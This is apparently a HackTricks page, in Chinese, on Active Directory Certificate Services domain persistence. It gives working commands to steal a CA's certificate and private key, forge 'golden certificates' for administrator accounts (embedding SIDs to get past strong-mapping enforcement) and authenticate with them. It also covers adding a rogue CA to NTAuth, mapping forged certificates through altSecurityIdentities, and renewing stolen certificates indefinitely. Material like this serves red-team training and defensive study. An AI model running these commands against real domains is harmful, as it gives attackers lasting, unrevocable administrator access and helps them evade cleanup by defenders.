# AD CS 域持久化

{{#include ../../../banners/hacktricks-training.md}}

**这是对 [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) 中介绍的域持久化技术的总结**。如需进一步了解详情，请查看该文档。<sup>[[5]](#references)</sup>

## 使用窃取的 CA Certificates 伪造 Certificates（Golden Certificate）- DPERSIST1

如何判断某个 certificate 是否为 CA certificate？

如果满足以下几个条件，则可以确定某个 certificate 是 CA certificate：<sup>[[5]](#references)</sup>

- 该 certificate 存储在 CA server 上，其 private key 由 machine 的 DPAPI 保护；如果 operating system 支持，也可能由 TPM/HSM 等 hardware 保护。
- certificate 的 Issuer 和 Subject 字段均与 CA 的 distinguished name 匹配。
- 仅 CA certificates 中存在 "CA Version" extension。
- certificate 不包含 Extended Key Usage（EKU）字段。

要提取该 certificate 的 private key，在 CA server 上使用 `certsrv.msc` tool，通过内置 GUI 进行操作是受支持的方法。不过，该 certificate 与系统中存储的其他 certificate 并无区别；因此，可以使用 [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) 等方法进行提取。

也可以使用 Certipy 通过以下 command 获取 certificate 和 private key：<sup>[[2]](#references)</sup>
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
在以 `.pfx` 格式获取 CA 证书及其私钥后，可以使用 [ForgeCert](https://github.com/GhostPack/ForgeCert) 等工具生成有效证书：
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 用于 certificate forgery 的目标用户必须处于 active 状态，并能够在 Active Directory 中进行身份验证，该过程才能成功。为 krbtgt 等特殊账户伪造 certificate 不会生效。

此伪造的 certificate 在指定的结束日期之前均会**有效**，并且只要根 CA certificate 仍然**有效**（通常为 5 至 **10 多年**）。它对**机器**同样有效，因此结合 **S4U2Self**，攻击者可以在 CA certificate 有效期间，**维持对域中任意机器的持久化访问**。\
此外，通过此方法**生成的 certificates**无法被撤销，因为 CA 不知道这些 certificates 的存在。

### 在 Strong Certificate Mapping Enforcement（2025+）下运行

自 2025 年 2 月 11 日起（KB5014754 部署后），domain controllers 默认对 certificate mappings 使用 **Full Enforcement**。实际上，这意味着伪造的 certificates 必须满足以下条件之一：

- 包含与目标账户的 strong binding（例如 SID security extension），或
- 在目标对象的 `altSecurityIdentities` attribute 上配置 strong、explicit mapping。<sup>[[1]](#references)</sup>

一种可靠的 persistence 方法是 mint 一个与被窃取的 Enterprise CA 链接的 forged certificate，然后向受害 principal 添加 strong explicit mapping：
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
注意
- 如果你能够构造包含 SID security extension 的伪造证书，即使在 Full Enforcement 模式下，这些证书也会被隐式映射。否则，优先使用显式强映射。有关显式映射的更多信息，请参阅 [account-persistence](account-persistence.md)。
- 吊销在这里无法帮助防御者：伪造证书在 CA database 中不存在，因此无法被吊销。

#### 兼容 Full-Enforcement 的伪造（SID-aware）

更新后的工具允许你直接嵌入 SID，即使 DC 拒绝弱映射，也能继续使用 golden certificates：<sup>[[3]](#references)</sup>
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
通过嵌入 SID，可以避免修改可能受到监控的 `altSecurityIdentities`，同时仍能满足 strong mapping 检查。

## Trusting Rogue CA Certificates - DPERSIST2

`NTAuthCertificates` 对象定义为在其 `cacertificate` 属性中包含一个或多个 **CA certificates**，供 Active Directory (AD) 使用。**domain controller** 的验证过程包括检查 `NTAuthCertificates` 对象，查找与身份验证 **certificate** 的 Issuer 字段中指定的 **CA** 匹配的条目。找到匹配项后，身份验证即可继续。<sup>[[5]](#references)</sup>

攻击者只要控制此 AD 对象，就可以将 self-signed CA certificate 添加到 `NTAuthCertificates` 对象中。通常，只有 **Enterprise Admin** 组成员，以及**forest root domain** 中的 **Domain Admins** 或 **Administrators**，才被授予修改此对象的权限。他们可以使用 `certutil.exe` 通过命令 `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` 编辑 `NTAuthCertificates` 对象，也可以使用 [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)。

以下是此技术的其他有用命令：
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
当与前文所述的使用 ForgeCert 动态生成 certificates 的方法结合使用时，此 capability 尤其相关。

> 2025 年之后的 mapping 注意事项：将 rogue CA 放入 NTAuth 只能建立对该 issuing CA 的信任。要在 DC 处于 **Full Enforcement** 状态时使用 leaf certificates 进行 logon，leaf 必须包含 SID security extension，或者目标对象上必须存在强显式 mapping（例如 `altSecurityIdentities` 中的 Issuer+Serial）。参见 {{#ref}}account-persistence.md{{#endref}}。

## 恶意错误配置 - DPERSIST3

通过修改 **AD CS** 组件的 **security descriptor** 来实现 **persistence** 的机会很多。"[Domain Escalation](domain-escalation.md)" 部分中描述的修改，可以由拥有 elevated access 的攻击者恶意实施。这包括向以下敏感组件添加 "control rights"（例如 WriteOwner/WriteDACL 等）：<sup>[[5]](#references)</sup>

- **CA server’s AD computer** object
- **CA server’s RPC/DCOM server**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 中的任何 **descendant AD object or container**（例如 Certificate Templates container、Certification Authorities container、NTAuthCertificates object 等）
- 默认情况下或由组织委派了控制 AD CS 权限的 **AD groups**（例如内置的 Cert Publishers group 及其任何成员）

一种恶意实施方式是：攻击者在 domain 中拥有 **elevated permissions**，向默认的 **`User`** certificate template 添加 **`WriteOwner`** permission，并将攻击者设置为该权限的 principal。要利用这一点，攻击者首先将 **`User`** template 的所有权更改为自己。随后，在该 template 上将 **`mspki-certificate-name-flag`** 设置为 **1**，以启用 **`ENROLLEE_SUPPLIES_SUBJECT`**，从而允许用户在请求中提供 Subject Alternative Name。之后，攻击者可以使用该 **template** 进行 **enroll**，选择一个 **domain administrator** 的名称作为 alternative name，并使用获得的 certificate 以 DA 身份进行 authentication。

攻击者可能设置的、用于长期 domain persistence 的实用配置项（完整详情和检测方法请参见 {{#ref}}domain-escalation.md{{#endref}}）：

- 允许 requesters 提供 SAN 的 CA policy flags（例如启用 `EDITF_ATTRIBUTESUBJECTALTNAME2`）。这会使类似 ESC1 的路径持续可利用。
- 允许签发可用于 authentication 的 certificate 的 template DACL 或 settings（例如添加 Client Authentication EKU、启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`）。
- 控制 `NTAuthCertificates` object 或 CA containers，以便在 defenders 尝试清理时持续重新引入 rogue issuers。

> [!TIP]
> 在 KB5014754 之后的 hardened environments 中，将这些错误配置与显式 strong mappings（`altSecurityIdentities`）结合，可以确保所签发或伪造的 certificates 即使在 DC 强制执行 strong mapping 时仍可使用。

### 利用 certificate renewal 实现 persistence（ESC14）

如果 compromise 了一个支持 authentication 的 certificate（或 Enrollment Agent certificate），只要 issuing template 仍处于 published 状态且 CA 仍信任 issuer chain，就可以**无限期 renew**该 certificate。Renewal 会保留原有的 identity bindings，同时延长有效期；除非修复 template 或重新发布 CA，否则很难将其 eviction。<sup>[[4]](#references)</sup>
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
如果域控制器处于 **Full Enforcement**，请添加 `-sid <victim SID>`（或使用仍包含 SID security extension 的模板），这样续期后的 leaf certificate 无需修改 `altSecurityIdentities` 即可继续进行 strong mapping。拥有 CA admin rights 的攻击者还可以在签发证书之前调整 `policy\RenewalValidityPeriodUnits`，以延长续期证书的有效期。<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
